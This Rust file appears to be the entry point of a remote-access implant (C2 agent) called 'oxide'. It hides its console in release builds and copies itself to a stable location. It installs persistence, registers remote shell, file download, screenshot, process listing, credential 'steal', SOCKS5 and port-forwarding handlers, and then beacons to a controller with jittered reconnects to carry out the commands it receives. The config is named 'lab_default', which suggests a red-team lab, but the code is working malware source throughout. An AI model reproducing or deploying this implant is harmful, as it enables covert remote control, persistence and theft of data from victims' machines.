// Hide console window on Windows in release builds.
// Debug keeps the console so stderr output is visible during development.
#![cfg_attr(all(target_os = "windows", not(debug_assertions)), windows_subsystem = "windows")]

/// Log to stderr in debug/test builds only. Silent in release.
#[macro_export]
macro_rules! dbg_log {
    ($($arg:tt)*) => {
        {
            #[cfg(debug_assertions)]
            {
                eprintln!($($arg)*);
            }
        }
    };
}

mod checkin;
mod commands;
mod config;
mod dispatcher;
mod evasion;
mod persistence;
mod platform;
mod transport;
#[cfg(feature = "http-transport")]
mod tunnel_client;

use commands::{
    file_download, file_list, persist_remove, persist_status, process_list, screenshot, shell,
    steal,
};
#[cfg(feature = "http-transport")]
use commands::{portfwd, socks5};
use oxide_shared::packet::Packet;
use rand::Rng;
use std::time::Duration;

const RECONNECT_BASE: f64 = 1.0;
const RECONNECT_MAX: f64 = 60.0;
const RECONNECT_JITTER: f64 = 0.25;

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    // Install ring as the default rustls crypto provider. Required when both
    // reqwest (ring) and tokio-tungstenite (aws-lc-rs) pull different backends.
    let _ = rustls::crypto::ring::default_provider().install_default();

    let config = config::Config::lab_default();

    let mut dispatch = dispatcher::Dispatcher::new();
    dispatch.register("shell", Box::new(shell::ShellHandler));
    dispatch.register("file_list", Box::new(file_list::FileListHandler));
    dispatch.register(
        "file_download",
        Box::new(file_download::FileDownloadHandler),
    );
    dispatch.register("screenshot", Box::new(screenshot::ScreenshotHandler));
    dispatch.register("process_list", Box::new(process_list::ProcessListHandler));
    dispatch.register(
        "persist_status",
        Box::new(persist_status::PersistStatusHandler),
    );
    dispatch.register(
        "persist_remove",
        Box::new(persist_remove::PersistRemoveHandler),
    );
    dispatch.register("steal", Box::new(steal::StealHandler));

    #[cfg(feature = "http-transport")]
    {
        dispatch.register(
            "socks5_start",
            Box::new(socks5::Socks5StartHandler::new(config.clone())),
        );
        dispatch.register(
            "portfwd_add",
            Box::new(portfwd::PortFwdHandler::new(config.clone())),
        );
    }

    let stable_path = persistence::copy_to_stable().unwrap_or_else(|e| {
        dbg_log!("[!] copy_to_stable: {e}");
        std::env::current_exe().unwrap_or_default()
    });

    let chain = persistence::get_chain();
    for r in &chain.install_first_available(&stable_path) {
        if r.installed {
            dbg_log!("[+] Persistence installed: {}", r.name);
        } else {
            dbg_log!(
                "[!] Persistence failed ({}): {}",
                r.name,
                r.error.as_deref().unwrap_or("?")
            );
        }
    }

    let mut backoff = RECONNECT_BASE;
    loop {
        dbg_log!("[*] Connecting to {}:{}...", config.host, config.port);

        #[cfg(feature = "http-transport")]
        let result = match transport::HttpTransport::connect(&config).await {
            Ok(mut t) => {
                dbg_log!("[+] HTTP transport ready");
                backoff = RECONNECT_BASE;
                t.run(&dispatch, &chain).await
            }
            Err(e) => Err(e),
        };

        #[cfg(not(feature = "http-transport"))]
        let result = match transport::TlsTransport::connect(&config).await {
            Ok(mut t) => {
                dbg_log!("[+] TLS handshake complete");
                backoff = RECONNECT_BASE;
                run_tls_session(&mut t, &dispatch, &chain).await
            }
            Err(e) => Err(e),
        };

        if let Err(e) = result {
            dbg_log!("[!] Session ended: {e}");
        }
        let jitter = rand::thread_rng().gen_range(-RECONNECT_JITTER..RECONNECT_JITTER);
        let delay = backoff * (1.0 + jitter);
        dbg_log!("[*] Reconnecting in {delay:.1}s...");
        tokio::time::sleep(Duration::from_secs_f64(delay)).await;
        backoff = (backoff * 2.0).min(RECONNECT_MAX);
    }
}

async fn run_tls_session(
    transport: &mut transport::TlsTransport,
    dispatch: &dispatcher::Dispatcher,
    chain: &persistence::PersistenceChain,
) -> anyhow::Result<()> {
    let checkin_pkt = checkin::build_checkin_packet(&chain.check_all());
    transport.send(checkin_pkt).await?;

    let ack = transport.receive().await?;
    let session_id = ack.data["session_id"].as_str().unwrap_or("?");
    dbg_log!("[+] Registered, session: {session_id}");

    loop {
        let packet = transport.receive().await?;
        match packet.packet_type.as_str() {
            "command" => {
                transport.send(dispatch.dispatch(&packet)).await?;
            }
            "heartbeat" => {
                transport
                    .send(Packet::new("heartbeat", serde_json::json!({})))
                    .await?;
            }
            other => dbg_log!("[!] Unknown packet type: {other}"),
        }
    }
}
